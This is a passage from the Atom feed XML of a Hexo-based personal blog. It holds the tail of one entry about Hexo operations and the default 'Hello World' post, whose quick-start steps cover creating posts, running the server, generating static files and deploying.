    <summary type="html">&lt;h4 id=&quot;hexo操作&quot;&gt;&lt;a href=&quot;#hexo操作&quot; class=&quot;headerlink&quot; title=&quot;hexo操作&quot;&gt;&lt;/a&gt;hexo操作&lt;/h4&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
      
    
    
    
    
    <category term="个人博客" scheme="http://van0308.github.io/tags/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://van0308.github.io/2023/02/02/hello-world/"/>
    <id>http://van0308.github.io/2023/02/02/hello-world/</id>
    <published>2023-02-02T09:13:27.137Z</published>
    <updated>2023-02-02T09:13:27.137Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
